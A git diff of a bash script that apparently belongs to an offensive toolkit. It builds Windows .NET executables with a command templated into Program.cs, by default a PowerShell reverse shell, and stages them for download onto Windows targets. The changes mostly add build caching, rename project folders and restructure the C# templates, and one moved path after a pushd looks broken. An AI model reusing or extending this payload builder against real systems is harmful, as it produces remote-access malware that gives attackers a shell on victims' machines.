@@ -152,7 +152,6 @@ build_dotnet() {
         rm "$target_zip_file.zip"
     fi
     local project_zip_file="$dotnet_project_name.zip"
-    zip -r "$project_zip_file" "$dotnet_project_dir"
     build_command+="tar -xf $project_zip_file && cd $dotnet_project_name && "
     zip_command="cd $dotnet_project_name && $zip_command"
     target_zip_file="$dotnet_project_name/$target_zip_file"
@@ -197,11 +196,16 @@ build_dotnet() {
     fi   
     echo "Output file: $output_file"
     echo "Build command: $build_command"
+    if [[ -f "$dotnet_project_name.done" ]]; then
+        echo "Dotnet project already built, skipping build"
+        return 0
+    fi
+    zip -r "$project_zip_file" "$dotnet_project_dir"
     scp "$project_zip_file" "$windows_username@$windows_computername:~/$project_zip_file"
     ssh $windows_username@$windows_computername "$build_command"
     ssh $windows_username@$windows_computername "$zip_command"
     scp "$windows_username@$windows_computername:~/$target_zip_file" .
-
+    touch "$dotnet_project_name.done"
 }
 
 create_run_windows_exe() {
@@ -265,31 +269,35 @@ generate_windows_unzip() {
 }
 
 create_dotnet_web() {
-    local project_name="dotnet_web_project"
-    if [[ ! -d "$project_name" ]]; then
-        mkdir "$project_name"
+    local dotnet_project_name="$1"
+    if [[ -z "$dotnet_project_name" ]]; then
+        dotnet_project_name="dotnet_web_project"
+    fi
+    if [[ ! -d "$dotnet_project_name" ]]; then
+        mkdir "$dotnet_project_name"
     fi
     if [[ -z "$cmd" ]]; then
         cmd=$(get_powershell_reverse_shell)
     fi
-    pushd "$project_name" || return 1
-    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
-    cp "$SCRIPTDIR/../cs/web.csproj" $project_name.csproj
-    cp "$SCRIPTDIR/../cs/Startup.cs" Startup.cs
-    cp "$SCRIPTDIR/../cs/WebApp.cs" WebApp.cs
-    cp "$SCRIPTDIR/../cs/CommandController.cs" CommandController.cs
-    dotnet clean
-    cp Program.cs.original Program.cs        
-    local command=$(escape_sed "$cmd")
-    sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
-    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
-    popd || return 1
-    if [[ -f "$project_name.zip" ]]; then
-        rm "$project_name.zip"
+    if [[ ! -f "$dotnet_project_name.done" ]]; then
+        cp -rf $SCRIPTDIR/../cs/web_project/* "$dotnet_project_name"
+        mv "$dotnet_project_name/web_project.csproj" "$dotnet_project_name/$dotnet_project_name.csproj"
+        pushd "$dotnet_project_name" || return 1
+        dotnet clean
+        local command=$(escape_sed "$cmd")
+        sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
+        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
+        popd || return 1
+        if [[ -f "$dotnet_project_name.zip" ]]; then
+            rm "$dotnet_project_name.zip"
+        fi
+        zip -r $dotnet_project_name.zip $dotnet_project_name
+        touch "$dotnet_project_name.done"
+    else
+        echo "Dotnet web project already built, skipping build"
     fi
-    zip -r $project_name.zip $project_name
-    generate_windows_download "$project_name.zip"
-    generate_windows_unzip "$project_name.zip"
+    generate_windows_download "$dotnet_project_name.zip"
+    generate_windows_unzip "$dotnet_project_name.zip"
 
 
 }
@@ -302,11 +310,10 @@ create_dotnet() {
     if [[ -z "$cmd" ]]; then
         cmd=$(get_powershell_reverse_shell)
     fi
+    cp -rf $SCRIPTDIR/../cs/exe_project/* "$project_name"
     pushd "$project_name" || return 1
-    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
-    cp "$SCRIPTDIR/../cs/cs.csproj" $project_name.csproj
+    mv "$project_name/exe_project.csproj" "$project_name/$project_name.csproj"
     dotnet clean
-    cp Program.cs.original Program.cs        
     local command=$(escape_sed "$cmd")
     sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
     dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
